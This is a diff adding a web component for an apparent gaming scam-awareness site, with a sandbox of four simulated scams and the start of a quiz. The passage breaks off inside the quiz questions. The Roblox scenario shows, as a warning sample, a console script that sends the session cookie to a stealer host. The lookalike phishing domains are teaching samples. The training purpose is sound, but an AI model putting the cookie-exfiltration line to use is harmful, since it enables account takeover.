@@ -1,0 +1,839 @@
+---
+interface Props {
+  currentLang: 'en' | 'ru';
+}
+
+const { currentLang } = Astro.props;
+const isRu = currentLang === 'ru';
+---
+
+<div class="w-full max-w-5xl mx-auto" id="scam-lab-container">
+  <!-- Mode Switcher Tabs -->
+  <div class="flex items-center justify-center mb-8">
+    <div class="inline-flex p-1.5 rounded-2xl bg-slate-200/80 dark:bg-navy-800 border border-slate-300 dark:border-navy-700 shadow-sm">
+      <button
+        type="button"
+        id="tab-sandbox-btn"
+        class="px-5 sm:px-8 py-2.5 rounded-xl font-heading font-bold text-xs sm:text-sm transition-all duration-200 bg-white dark:bg-navy-900 text-slate-900 dark:text-cloud shadow-md"
+      >
+        <span>🕹️ {isRu ? 'Интерактивная песочница атак' : 'Interactive Attack Sandbox'}</span>
+      </button>
+      <button
+        type="button"
+        id="tab-test-btn"
+        class="px-5 sm:px-8 py-2.5 rounded-xl font-heading font-bold text-xs sm:text-sm transition-all duration-200 text-slate-600 dark:text-cloud-muted hover:text-slate-900 dark:hover:text-cloud"
+      >
+        <span>🎓 {isRu ? 'Тест и Сертификация' : 'Scam Exam & Certificate'}</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- SECTION 1: ATTACK SANDBOX (Simulations) -->
+  <div id="section-sandbox" class="space-y-8 animate-fade-in">
+    <!-- Sandbox Header & Controls -->
+    <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-6 rounded-2xl border border-slate-200 dark:border-navy-700 bg-white/90 dark:bg-navy-850/90 shadow-sm">
+      <div>
+        <span class="text-[11px] font-bold uppercase tracking-wider text-cyan-dark dark:text-cyan">
+          {isRu ? 'Лаборатория киберугроз SafeInGame' : 'SafeInGame Cyber Threat Lab'}
+        </span>
+        <h3 class="text-xl sm:text-2xl font-heading font-extrabold text-slate-900 dark:text-cloud mt-1">
+          {isRu ? 'Тренажёр реальных скам-сценариев' : 'Real-World Scam Scenarios Sandbox'}
+        </h3>
+        <p class="text-xs sm:text-sm text-slate-600 dark:text-cloud-muted mt-1">
+          {isRu
+            ? 'Изучите подозрительный интерфейс, включите «Рентген угроз» для поиска скрытых ловушек и примите решение.'
+            : 'Inspect the suspicious interface, toggle X-Ray Mode to reveal hidden traps, and make your security decision.'}
+        </p>
+      </div>
+
+      <!-- X-Ray Mode Toggle Button -->
+      <button
+        type="button"
+        id="toggle-xray-btn"
+        class="flex-shrink-0 inline-flex items-center gap-2 px-5 py-3 rounded-xl font-heading font-bold text-xs uppercase tracking-wider border border-violet-500/50 bg-violet-500/10 text-violet-700 dark:text-violet hover:bg-violet-500/20 shadow-sm transition-all hover:scale-105 active:scale-95 group"
+      >
+        <span class="text-base group-hover:rotate-12 transition-transform">🔬</span>
+        <span id="xray-btn-text">{isRu ? 'Включить Рентген угроз' : 'Enable Threat X-Ray'}</span>
+      </button>
+    </div>
+
+    <!-- Scenario Navigation Pills -->
+    <div class="flex flex-wrap gap-2 justify-center">
+      <button
+        type="button"
+        data-scenario="0"
+        class="scenario-nav-btn px-4 py-2 rounded-xl text-xs font-heading font-bold border transition-all bg-cyan text-navy-950 border-cyan shadow-sm"
+      >
+        <span>1. Discord: Голосование турнира</span>
+      </button>
+      <button
+        type="button"
+        data-scenario="1"
+        class="scenario-nav-btn px-4 py-2 rounded-xl text-xs font-heading font-bold border transition-all bg-slate-100 dark:bg-navy-800 text-slate-700 dark:text-cloud border-slate-200 dark:border-navy-700 hover:border-cyan"
+      >
+        <span>2. Steam: Подмена трейда (API MitM)</span>
+      </button>
+      <button
+        type="button"
+        data-scenario="2"
+        class="scenario-nav-btn px-4 py-2 rounded-xl text-xs font-heading font-bold border transition-all bg-slate-100 dark:bg-navy-800 text-slate-700 dark:text-cloud border-slate-200 dark:border-navy-700 hover:border-cyan"
+      >
+        <span>3. Roblox: Кража сессионного cookie</span>
+      </button>
+      <button
+        type="button"
+        data-scenario="3"
+        class="scenario-nav-btn px-4 py-2 rounded-xl text-xs font-heading font-bold border transition-all bg-slate-100 dark:bg-navy-800 text-slate-700 dark:text-cloud border-slate-200 dark:border-navy-700 hover:border-cyan"
+      >
+        <span>4. Supercell: Перехват кода входа</span>
+      </button>
+    </div>
+
+    <!-- The Simulation Display Container -->
+    <div id="simulation-frame" class="relative rounded-3xl border border-slate-300 dark:border-navy-700 bg-white dark:bg-navy-900 shadow-xl overflow-hidden transition-all duration-300">
+      <!-- Top Browser/App Simulated Window Bar -->
+      <div class="px-5 py-3 border-b border-slate-200 dark:border-navy-800 bg-slate-100 dark:bg-navy-950 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <span class="w-3 h-3 rounded-full bg-red-500/80"></span>
+          <span class="w-3 h-3 rounded-full bg-yellow-500/80"></span>
+          <span class="w-3 h-3 rounded-full bg-green-500/80"></span>
+          <span id="sim-window-title" class="ml-3 text-xs font-mono text-slate-500 dark:text-cloud-subtle font-medium">
+            Discord — Direct Message
+          </span>
+        </div>
+        <div class="text-[11px] font-mono text-slate-400 dark:text-navy-400 hidden sm:block">
+          SafeInGame Sandbox Environment
+        </div>
+      </div>
+
+      <!-- Simulated Inner Content Area -->
+      <div id="sim-content-body" class="p-6 sm:p-8 min-h-[340px] flex flex-col justify-between">
+        <!-- Injected via JavaScript based on active scenario -->
+      </div>
+
+      <!-- Action Choice Bar -->
+      <div class="p-4 sm:p-6 border-t border-slate-200 dark:border-navy-800 bg-slate-50 dark:bg-navy-950/70 flex flex-col sm:flex-row items-center justify-between gap-4">
+        <span class="text-xs font-semibold text-slate-600 dark:text-cloud-muted">
+          {isRu ? 'Каков ваш вердикт по этому сообщению/действию?' : 'What is your security verdict on this prompt?'}
+        </span>
+        <div class="flex items-center gap-3 w-full sm:w-auto">
+          <button
+            type="button"
+            id="btn-verdict-safe"
+            class="flex-1 sm:flex-none px-6 py-2.5 rounded-xl font-heading font-bold text-xs bg-slate-200 dark:bg-navy-800 text-slate-700 dark:text-cloud hover:bg-slate-300 dark:hover:bg-navy-700 transition-all border border-slate-300 dark:border-navy-700"
+          >
+            {isRu ? 'Это безопасно' : 'Mark as Safe'}
+          </button>
+          <button
+            type="button"
+            id="btn-verdict-scam"
+            class="flex-1 sm:flex-none px-6 py-2.5 rounded-xl font-heading font-bold text-xs bg-red-600 hover:bg-red-500 text-white shadow-md shadow-red-500/20 transition-all hover:scale-105 active:scale-95"
+          >
+            {isRu ? '🚨 Это скам! Заблокировать' : '🚨 This is a Scam! Block'}
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Feedback Banner after verdict -->
+    <div id="sandbox-feedback" class="hidden p-6 rounded-2xl border transition-all duration-300 animate-fade-in">
+      <div class="flex items-start gap-4">
+        <span id="feedback-icon" class="text-3xl"></span>
+        <div class="space-y-2">
+          <h4 id="feedback-title" class="text-lg font-heading font-extrabold"></h4>
+          <p id="feedback-desc" class="text-xs sm:text-sm leading-relaxed"></p>
+          <div id="feedback-flags-list" class="pt-2 flex flex-wrap gap-2"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECTION 2: CERTIFICATION SCAM TEST -->
+  <div id="section-test" class="hidden space-y-8 animate-fade-in">
+    <!-- Test Card Container -->
+    <div class="rounded-3xl border border-slate-200 dark:border-navy-700 bg-white/95 dark:bg-navy-850/95 p-6 sm:p-10 shadow-xl">
+      <!-- Test Header & Progress -->
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-slate-200 dark:border-navy-800">
+        <div>
+          <span class="text-xs font-bold uppercase tracking-wider text-cyan-dark dark:text-cyan">
+            {isRu ? 'Официальный экзамен цифровой гигиены' : 'Official Cyber Hygiene Exam'}
+          </span>
+          <h3 class="text-2xl font-heading font-extrabold text-slate-900 dark:text-cloud mt-1">
+            {isRu ? 'Тест на распознавание игрового скама' : 'Gaming Scam Recognition Exam'}
+          </h3>
+        </div>
+
+        <div class="flex items-center gap-3">
+          <span id="test-progress-text" class="text-sm font-heading font-extrabold text-slate-700 dark:text-cloud">
+            {isRu ? 'Вопрос 1 из 8' : 'Question 1 of 8'}
+          </span>
+          <div class="w-32 h-2.5 rounded-full bg-slate-200 dark:bg-navy-900 overflow-hidden">
+            <div id="test-progress-bar" class="h-full bg-cyan transition-all duration-300 w-[12.5%]"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Question & Scenario Box -->
+      <div id="test-active-question" class="py-8 space-y-6">
+        <div class="p-5 rounded-2xl bg-slate-100/70 dark:bg-navy-900/80 border border-slate-200 dark:border-navy-800">
+          <span id="question-badge" class="px-2.5 py-0.5 rounded-lg text-[10px] font-bold uppercase tracking-wider bg-cyan/20 text-cyan-800 dark:text-cyan border border-cyan/40 inline-block mb-2">
+            Сценарий
+          </span>
+          <p id="question-text" class="text-base sm:text-lg font-heading font-bold text-slate-900 dark:text-cloud leading-relaxed">
+            <!-- Populated via JS -->
+          </p>
+        </div>
+
+        <!-- Answers Options -->
+        <div id="answers-container" class="space-y-3">
+          <!-- Populated via JS -->
+        </div>
+
+        <!-- Answer Explanation Box (Hidden until answered) -->
+        <div id="explanation-box" class="hidden p-5 rounded-2xl border transition-all animate-fade-in">
+          <div class="flex items-start gap-3">
+            <span id="expl-icon" class="text-xl"></span>
+            <div>
+              <h5 id="expl-title" class="text-sm font-heading font-bold mb-1"></h5>
+              <p id="expl-text" class="text-xs sm:text-sm text-slate-600 dark:text-cloud-muted leading-relaxed"></p>
+            </div>
+          </div>
+          <div class="mt-4 flex justify-end">
+            <button
+              type="button"
+              id="btn-next-question"
+              class="px-6 py-2.5 rounded-xl font-heading font-bold text-xs bg-cyan text-navy-950 hover:bg-cyan-light transition-all shadow-sm"
+            >
+              {isRu ? 'Следующий вопрос →' : 'Next Scenario →'}
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Test Final Certificate Results View (Hidden initially) -->
+      <div id="test-results-view" class="hidden text-center py-6 space-y-8 animate-fade-in">
+        <div class="max-w-md mx-auto space-y-3">
+          <div class="inline-flex items-center justify-center w-20 h-20 rounded-full bg-cyan-500/20 text-cyan-700 dark:text-cyan text-4xl shadow-inner mb-2">
+            🏆
+          </div>
+          <h3 class="text-3xl font-heading font-extrabold text-slate-900 dark:text-cloud">
+            {isRu ? 'Экзамен завершён!' : 'Exam Completed!'}
+          </h3>
+          <p class="text-sm text-slate-600 dark:text-cloud-muted">
+            {isRu
+              ? 'Ваш результат зафиксирован в сертификате безопасности SafeInGame.'
+              : 'Your score has been certified by the SafeInGame Security Engine.'}
+          </p>
+          <div class="p-4 rounded-2xl border border-cyan-500/40 bg-cyan-500/10">
+            <span class="text-3xl font-heading font-extrabold text-slate-900 dark:text-cloud" id="final-score-display">
+              8 / 8 (100%)
+            </span>
+            <div id="final-rank-badge" class="mt-1 text-xs font-bold uppercase tracking-wider text-cyan-dark dark:text-cyan">
+              Cyber Defense Master
+            </div>
+          </div>
+        </div>
+
+        <!-- Custom Certificate Generator Preview -->
+        <div
+          id="certificate-box"
+          class="relative max-w-2xl mx-auto p-8 rounded-3xl border-2 border-cyan/60 bg-gradient-to-br from-slate-900 via-navy-950 to-slate-950 text-white shadow-2xl overflow-hidden"
+        >
+          <!-- Certificate Ambient Glow & Seal -->
+          <div class="absolute top-0 right-0 -mr-16 -mt-16 w-48 h-48 rounded-full bg-cyan/15 blur-2xl pointer-events-none"></div>
+
+          <div class="relative z-10 flex items-center justify-between border-b border-navy-700 pb-4 mb-6">
+            <div class="flex items-center gap-3">
+              <img src="/images/logo.png" alt="SafeInGame" class="w-10 h-10 object-contain rounded-lg" />
+              <div class="text-left">
+                <div class="font-heading font-extrabold text-base tracking-wider text-cloud">SafeInGame</div>
+                <div class="text-[9px] uppercase tracking-widest text-cyan">Cyber Defense Institute</div>
+              </div>
+            </div>
+            <div class="text-right">
+              <span class="text-[10px] font-mono text-cloud-subtle block">VERIFIED CERTIFICATE</span>
+              <span id="cert-id" class="text-xs font-mono text-cyan font-bold">SIG-2026-9482</span>
+            </div>
+          </div>
+
+          <div class="relative z-10 py-4 text-center space-y-3">
+            <span class="text-xs font-mono uppercase tracking-widest text-cloud-muted">
+              {isRu ? 'СЕРТИФИКАТ КИБЕРБЕЗОПАСНОСТИ' : 'CERTIFICATE OF CYBER RESILIENCE'}
+            </span>
+            <h4 class="text-lg font-heading text-cloud-muted">
+              {isRu ? 'Настоящим подтверждается, что' : 'This is proudly presented to'}
+            </h4>
+            <div class="py-1">
+              <input
+                type="text"
+                id="cert-user-name"
+                value="Gamer Specialist"
+                placeholder={isRu ? 'Введите ваше имя или ник' : 'Enter your name or gamer tag'}
+                class="bg-transparent text-center text-2xl sm:text-3xl font-heading font-extrabold text-cyan border-b border-cyan/40 focus:outline-none focus:border-cyan w-full max-w-md pb-1 placeholder-slate-600"
+              />
+              <span class="block text-[10px] text-cloud-subtle mt-1 font-mono">
+                {isRu ? '(Кликните, чтобы изменить имя на сертификате)' : '(Click above to edit name on certificate)'}
+              </span>
+            </div>
+            <p class="text-xs text-cloud-muted max-w-lg mx-auto leading-relaxed">
+              {isRu
+                ? 'Успешно освоил(а) методы противодействия фишингу, тайпосквоттингу, социальной инженерии и защите игровых аккаунтов.'
+                : 'Successfully demonstrated verified proficiency in identifying phishing domains, API key exploits, social engineering, and gaming asset defense.'}
+            </p>
+          </div>
+
+          <div class="relative z-10 pt-6 mt-4 border-t border-navy-700/80 flex items-center justify-between text-xs text-cloud-subtle font-mono">
+            <div>
+              <span>Date: </span>
+              <span id="cert-date">2026-10-27</span>
+            </div>
+            <div class="flex items-center gap-1.5 text-cyan">
+              <span>Verified Authenticity</span>
+              <span>✓</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Action Buttons -->
+        <div class="flex flex-wrap items-center justify-center gap-4">
+          <button
+            type="button"
+            id="btn-print-cert"
+            class="px-6 py-3 rounded-xl font-heading font-bold text-xs bg-cyan text-navy-950 hover:bg-cyan-light shadow-md transition-all hover:scale-105 active:scale-95"
+          >
+            🖨️ {isRu ? 'Распечатать / Сохранить сертификат (PDF)' : 'Print / Save Certificate (PDF)'}
+          </button>
+          <button
+            type="button"
+            id="btn-restart-exam"
+            class="px-6 py-3 rounded-xl font-heading font-bold text-xs bg-slate-200 dark:bg-navy-800 text-slate-700 dark:text-cloud hover:bg-slate-300 dark:hover:bg-navy-700 transition-all border border-slate-300 dark:border-navy-700"
+          >
+            🔄 {isRu ? 'Пройти тест заново' : 'Retake Exam'}
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script define:vars={{ isRu }}>
+  function initScamLab() {
+    // Tab toggling
+    const tabSandbox = document.getElementById('tab-sandbox-btn');
+    const tabTest = document.getElementById('tab-test-btn');
+    const secSandbox = document.getElementById('section-sandbox');
+    const secTest = document.getElementById('section-test');
+
+    if (!tabSandbox || !tabTest) return;
+
+    tabSandbox.onclick = () => {
+      tabSandbox.className = 'px-5 sm:px-8 py-2.5 rounded-xl font-heading font-bold text-xs sm:text-sm transition-all duration-200 bg-white dark:bg-navy-900 text-slate-900 dark:text-cloud shadow-md';
+      tabTest.className = 'px-5 sm:px-8 py-2.5 rounded-xl font-heading font-bold text-xs sm:text-sm transition-all duration-200 text-slate-600 dark:text-cloud-muted hover:text-slate-900 dark:hover:text-cloud';
+      secSandbox.classList.remove('hidden');
+      secTest.classList.add('hidden');
+    };
+
+    tabTest.onclick = () => {
+      tabTest.className = 'px-5 sm:px-8 py-2.5 rounded-xl font-heading font-bold text-xs sm:text-sm transition-all duration-200 bg-white dark:bg-navy-900 text-slate-900 dark:text-cloud shadow-md';
+      tabSandbox.className = 'px-5 sm:px-8 py-2.5 rounded-xl font-heading font-bold text-xs sm:text-sm transition-all duration-200 text-slate-600 dark:text-cloud-muted hover:text-slate-900 dark:hover:text-cloud';
+      secTest.classList.remove('hidden');
+      secSandbox.classList.add('hidden');
+    };
+
+    // --- PART 1: SANDBOX SIMULATOR LOGIC ---
+    let activeScenarioIdx = 0;
+    let isXrayActive = false;
+
+    const scenarios = [
+      {
+        title: isRu ? 'Discord — Личное сообщение от «друга»' : 'Discord — Direct Message from "Friend"',
+        windowTitle: 'Discord — @Alex_CS2 (Direct Message)',
+        isScam: true,
+        html: `
+          <div class="space-y-4">
+            <div class="flex items-start gap-3.5">
+              <div class="w-10 h-10 rounded-full bg-indigo-600 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">A</div>
+              <div class="space-y-1">
+                <div class="flex items-center gap-2">
+                  <span class="font-bold text-sm text-slate-900 dark:text-cloud">Alex_CS2</span>
+                  <span class="text-[10px] text-slate-400">Сегодня, 14:22</span>
+                  <span class="xray-target hidden px-2 py-0.5 rounded text-[10px] font-bold bg-orange-500/20 text-orange-600 border border-orange-500/40">
+                    ⚠ Учётная запись скомпрометирована через стилер
+                  </span>
+                </div>
+                <p class="text-xs sm:text-sm text-slate-700 dark:text-cloud-muted leading-relaxed">
+                  Привет бро! Моя команда вышла в полуфинал на открытом турнире Faceit! Нам не хватает всего 1 голоса зрителей для выхода на LAN-финал.
+                  Можешь плиз перейти и проголосовать за нас? Это бесплатно и занимает 5 секунд:
+                </p>
+                <div class="p-3 rounded-xl bg-slate-100 dark:bg-navy-950 border border-slate-200 dark:border-navy-800 space-y-2 mt-2">
+                  <div class="text-xs font-mono text-cyan-dark dark:text-cyan break-all">
+                    https://<span class="xray-highlight font-extrabold text-red-500">faceit-tournament-vote.xyz</span>/team/navi-junior
+                  </div>
+                  <div class="text-[11px] text-slate-500 dark:text-cloud-subtle">
+                    Faceit Esports — Community Fan Voting Stage 2
+                  </div>
+                  <div class="xray-target hidden text-[11px] font-bold text-red-500 pt-1 border-t border-slate-200 dark:border-navy-800">
+                    🚨 КРАСНЫЙ ФЛАГ: Настоящий Faceit работает только на faceit.com. Зона .xyz и призыв голосовать — классический фишинг!
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        `,
+        explanation: isRu
+          ? 'Это самый распространенный скам в Discord. Аккаунт вашего реального друга был взломан, и бот рассылает фишинговые ссылки по всем контактам. При переходе поддельный сайт попросит «войти через Steam» и украдёт логин, пароль и код мобильного аутентификатора.'
+          : 'Classic Discord tournament phishing lure. The friend\'s account was hijacked by a session stealer, and the link leads to a fake login modal harvesting Steam credentials.'
+      },
+      {
+        title: isRu ? 'Steam — Предложение обмена предметами' : 'Steam — Trade Offer Confirmation',
+        windowTitle: 'Steam Guard Mobile Confirmation — Trade #984210',
+        isScam: true,
+        html: `
+          <div class="space-y-4">
+            <div class="p-4 rounded-2xl bg-slate-100 dark:bg-navy-950 border border-slate-200 dark:border-navy-800 space-y-3">
+              <div class="flex items-center justify-between">
+                <span class="text-xs font-bold text-slate-700 dark:text-cloud">Обмен предметами с пользователем: Tradelink_Bot</span>
+                <span class="xray-target hidden px-2 py-0.5 rounded text-[10px] font-bold bg-red-500/20 text-red-500 border border-red-500/40">
+                  🚨 Аккаунт создан сегодня! Поддельный бот-клон
+                </span>
+              </div>
+              <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                <div class="p-3 rounded-xl bg-red-500/10 border border-red-500/30">
+                  <div class="text-[11px] font-bold text-red-500 mb-1">Вы отдаёте:</div>
+                  <div class="text-xs font-semibold text-slate-900 dark:text-cloud">★ Нож-бабочка | Волны (Прямо с завода)</div>
+                  <div class="text-[10px] text-slate-500">$650.00</div>
+                </div>
+                <div class="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30">
+                  <div class="text-[11px] font-bold text-emerald-500 mb-1">Вы получаете:</div>
+                  <div class="text-xs font-semibold text-slate-900 dark:text-cloud">Ничего (0 предметов)</div>
+                  <div class="xray-target hidden text-[10px] font-bold text-red-500 mt-1">
+                    ⚠ API-перехват: настоящий оффер отменен, бот создал дубликат!
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        `,
+        explanation: isRu
+          ? 'Это атака через Steam Web API (API Scam / MitM). Ранее вы авторизовались на фейковом сайте и злоумышленники создали API-ключ. Когда вы создали реальный обмен, бот отменил его и мгновенно создал новый с фейковым профилем, ожидая вашего слепого клика в Steam Guard!'
+          : 'Steam Web API Man-in-the-Middle attack. A rogue API key cancels legitimate trades and recreates duplicates with an impersonator bot.'
+      },
+      {
+        title: isRu ? 'Roblox — Предложение работы тестировщиком' : 'Roblox — Studio Tester Offer',
+        windowTitle: 'Roblox Message — Developer Recruitment',
+        isScam: true,
+        html: `
+          <div class="space-y-4">
+            <div class="p-4 rounded-2xl bg-slate-100 dark:bg-navy-950 border border-slate-200 dark:border-navy-800 space-y-3">
+              <div class="flex items-center gap-2">
+                <span class="font-bold text-sm text-slate-900 dark:text-cloud">StudioLead_Roblox</span>
+                <span class="xray-target hidden px-2 py-0.5 rounded text-[10px] font-bold bg-orange-500/20 text-orange-500 border border-orange-500/40">
+                  ⚠ 0 созданных плейсов, скрытый профиль
+                </span>
+              </div>
+              <p class="text-xs sm:text-sm text-slate-700 dark:text-cloud-muted leading-relaxed">
+                Привет! Мы разрабатываем новую аниме-игру в Roblox. Ищем тестеров, платим 5,000 Robux за 30 минут игры.
+                Для теста скачай наш файл проекта и запусти скрипт через консоль разработчика (F12):
+              </p>
+              <div class="p-3 rounded-xl bg-slate-200 dark:bg-navy-900 font-mono text-xs text-red-500 break-all">
+                document.cookie = "..."; fetch("https://stealer-worker.pages.dev/save?c=" + <span class="xray-highlight font-extrabold text-red-600">.ROBLOSECURITY</span>)
+              </div>
+              <div class="xray-target hidden text-xs font-bold text-red-500">
+                🚨 КРАСНЫЙ ФЛАГ: Скрипт ворует сессионную куку .ROBLOSECURITY. С ней мошенник заходит в ваш профиль без логина и 2FA!
+              </div>
+            </div>
+          </div>
+        `,
+        explanation: isRu
+          ? 'Никогда не вставляйте скрипты в консоль браузера (F12) и не передавайте куку `.ROBLOSECURITY`. Она содержит токен полной авторизации в Roblox и позволяет злоумышленнику полностью перехватить аккаунт в обход двухфакторной аутентификации.'
+          : 'Console script exploit targeting the .ROBLOSECURITY cookie to bypass two-factor authentication.'
+      },
+      {
+        title: isRu ? 'Supercell — «Предупреждение о входе»' : 'Supercell ID — Verification Alert',
+        windowTitle: 'Supercell ID Security Service — Notification',
+        isScam: true,
+        html: `
+          <div class="space-y-4">
+            <div class="p-4 rounded-2xl bg-slate-100 dark:bg-navy-950 border border-slate-200 dark:border-navy-800 space-y-3">
+              <div class="flex items-center justify-between">
+                <span class="font-bold text-sm text-slate-900 dark:text-cloud">Supercell Support Bot</span>
+                <span class="xray-target hidden px-2 py-0.5 rounded text-[10px] font-bold bg-red-500/20 text-red-500 border border-red-500/40">
+                  🚨 Фальшивый бот в Telegram / VK
+                </span>
+              </div>
+              <p class="text-xs sm:text-sm text-slate-700 dark:text-cloud-muted leading-relaxed">
+                Внимание! В ваш аккаунт Brawl Stars совершён вход с подозрительного устройства (Франкфурт, Германия).
+                Если это были не вы, вам на почту отправлен 6-значный код отмены. Отправьте этот код сюда, чтобы заблокировать сессию мошенника.
+              </p>
+              <div class="xray-target hidden text-xs font-bold text-red-500">
+                🚨 КРАСНЫЙ ФЛАГ: Код на почте — это код ВХОДА в игру, который запросил сам мошенник! Официальная поддержка Supercell НИКОГДА не просит коды.
+              </div>
+            </div>
+          </div>
+        `,
+        explanation: isRu
+          ? 'Злоумышленник ввёл вашу почту на экране входа в игру. Игра сгенерировала легитимный код доступа. Мошенник маскируется под бота безопасности, чтобы вы сами отдали ему этот код!'
+          : 'Reverse social engineering. The attacker initiates a login request and tricks the victim into providing the verification code under the guise of an alert.'
+      }
+    ];
+
+    const simTitle = document.getElementById('sim-window-title');
+    const simBody = document.getElementById('sim-content-body');
+    const xrayBtn = document.getElementById('toggle-xray-btn');
+    const xrayText = document.getElementById('xray-btn-text');
+    const verdictSafe = document.getElementById('btn-verdict-safe');
+    const verdictScam = document.getElementById('btn-verdict-scam');
+    const feedbackBox = document.getElementById('sandbox-feedback');
+    const feedbackTitle = document.getElementById('feedback-title');
+    const feedbackDesc = document.getElementById('feedback-desc');
+    const feedbackIcon = document.getElementById('feedback-icon');
+
+    function renderScenario(idx) {
+      activeScenarioIdx = idx;
+      const cur = scenarios[idx];
+      simTitle.textContent = cur.windowTitle;
+      simBody.innerHTML = cur.html;
+      feedbackBox.classList.add('hidden');
+      isXrayActive = false;
+      xrayText.textContent = isRu ? 'Включить Рентген угроз' : 'Enable Threat X-Ray';
+
+      document.querySelectorAll('.scenario-nav-btn').forEach((btn, bIdx) => {
+        if (bIdx === idx) {
+          btn.className = 'scenario-nav-btn px-4 py-2 rounded-xl text-xs font-heading font-bold border transition-all bg-cyan text-navy-950 border-cyan shadow-sm';
+        } else {
+          btn.className = 'scenario-nav-btn px-4 py-2 rounded-xl text-xs font-heading font-bold border transition-all bg-slate-100 dark:bg-navy-800 text-slate-700 dark:text-cloud border-slate-200 dark:border-navy-700 hover:border-cyan';
+        }
+      });
+    }
+
+    document.querySelectorAll('.scenario-nav-btn').forEach((btn) => {
+      btn.onclick = () => {
+        const idx = parseInt(btn.getAttribute('data-scenario') || '0', 10);
+        renderScenario(idx);
+      };
+    });
+
+    xrayBtn.onclick = () => {
+      isXrayActive = !isXrayActive;
+      xrayText.textContent = isXrayActive
+        ? (isRu ? 'Выключить Рентген угроз' : 'Disable Threat X-Ray')
+        : (isRu ? 'Включить Рентген угроз' : 'Enable Threat X-Ray');
+
+      document.querySelectorAll('.xray-target').forEach((el) => {
+        if (isXrayActive) {
+          el.classList.remove('hidden');
+        } else {
+          el.classList.add('hidden');
+        }
+      });
+    };
+
+    function showVerdict(userChoseScam) {
+      const cur = scenarios[activeScenarioIdx];
+      feedbackBox.classList.remove('hidden');
+      feedbackBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+
+      if (userChoseScam === cur.isScam) {
+        feedbackBox.className = 'p-6 rounded-2xl border border-emerald-500/50 bg-emerald-500/10 text-emerald-800 dark:text-emerald-300';
+        feedbackIcon.textContent = '🎯';
+        feedbackTitle.textContent = isRu ? 'Абсолютно верно! Угроза нейтрализована' : 'Spot On! Threat Neutralized';
+      } else {
+        feedbackBox.className = 'p-6 rounded-2xl border border-red-500/50 bg-red-500/10 text-red-800 dark:text-red-300';
+        feedbackIcon.textContent = '❌';
+        feedbackTitle.textContent = isRu ? 'Ошибка! Ваш аккаунт был бы скомпрометирован' : 'Critical Failure! Account Compromised';
+      }
+      feedbackDesc.textContent = cur.explanation;
+    }
+
+    verdictSafe.onclick = () => showVerdict(false);
+    verdictScam.onclick = () => showVerdict(true);
+
+    renderScenario(0);
+
+
+    // --- PART 2: CERTIFICATION SCAM EXAM LOGIC ---
+    const examQuestions = [
+      {
+        scenario: isRu
+          ? 'Вам в Steam пишет незнакомый пользователь с аватаром сотрудника Valve и утверждает: «На ваш аккаунт отправлено 15 жалоб за мошенничество. Передайте скины боту проверки Valve или получите перманентный бан через 2 часа».'
+          : 'A user with a Valve employee badge messages you on Steam stating: "15 fraud reports received against your account. Transfer your items to the Valve verification bot or face a permanent ban in 2 hours."',
+        answers: isRu
+          ? [
+              'Передать скины, чтобы не потерять аккаунт навсегда.',
+              'Сотрудники поддержки Valve НИКОГДА не пишут в чат и не требуют передавать предметы. Немедленно заблокировать и пожаловаться.',
+              'Попросить сотрудника показать служебное удостоверение в Discord.'
+            ]
+          : [
+              'Transfer the items to avoid losing the account permanently.',
+              'Valve staff NEVER contact players via chat or demand item transfers. Block and report immediately.',
+              'Ask the agent to verify their badge over a Discord screen share.'
+            ],
+        correct: 1,
+        expl: isRu
+          ? 'Администраторы Steam, Valve, Supercell и других игр никогда не пишут в личные сообщения игрокам и не требуют передать вещи «на проверку». Это 100% скам на испуг.'
+          : 'Official support never communicates via chat and never requests item custody for "investigations".'
+      },
+      {
+        scenario: isRu
+          ? 'Вам прислали ссылку на обмен в Steam: «https://steаmcommunity.com/tradeoffer/new». Вы переходите, и браузер открывает окно авторизации. В чем скрытая опасность?'
+          : 'You receive a trade link: "https://steаmcommunity.com/tradeoffer/new". You open it and see a login window. What is the hidden threat?',
+        answers: isRu
+          ? [
+              'В слове "steаm" буква "а" заменена невидимым кириллическим символом (Homoglyph атака). Это фишинговый двойник.',
+              'Опасности нет, так как ссылка начинается с безопасного протокола https://.',
+              'Опасность только в том, что у вас может быть выключен Steam Guard.'
+            ]
+          : [
+              'The "a" in "steam" is a Cyrillic homoglyph (Punycode spoofing). It is a counterfeit phishing clone.',
+              'There is no danger because the protocol starts with https://.',
+              'The danger is only present if Steam Guard is deactivated.'
+            ],
+        correct: 0,
+        expl: isRu
+          ? 'Протокол HTTPS подтверждает только шифрование соединения, но не честность владельца сайта. Мошенники регистрируют поддельные домены с кириллическими символами (Punycode).'
+          : 'HTTPS certificates are issued for any domain, including phishing domains. Cyrillic homoglyphs look identical but point to attacker servers.'
+      },
+      {
+        scenario: isRu
+          ? 'Что произойдет, если на вашем аккаунте Steam злоумышленник сгенерирует тайный Web API-ключ?'
+          : 'What occurs if a threat actor generates a secret Steam Web API Key on your account?',
+        answers: isRu
+          ? [
+              'Ничего, так как для обменов всё равно нужно мобильное подтверждение.',
+              'Злоумышленник сможет автоматически отменять ваши легитимные обмены и подменять их своими ботами-двойниками в момент подтверждения.',
+              'У вас автоматически заблокируется торговая площадка на 30 дней.'
+            ]
+          : [
+              'Nothing, because trades still require mobile 2FA confirmations.',
+              'The attacker can silently cancel legitimate trades and substitute duplicate trades with impersonator bots upon confirmation.',
+              'The Steam Community Market is automatically frozen for 30 days.'
+            ],
+        correct: 1,
+        expl: isRu
+          ? 'Это механика API-скама. Бот перехватывает трейды через API и подсовывает своего клона прямо перед тем, как вы нажмёте кнопку подтверждения в телефоне.'
+          : 'Steam API keys grant access to trade management, enabling automated Man-in-the-Middle trade cancellations and duplicate bot swaps.'
+      },
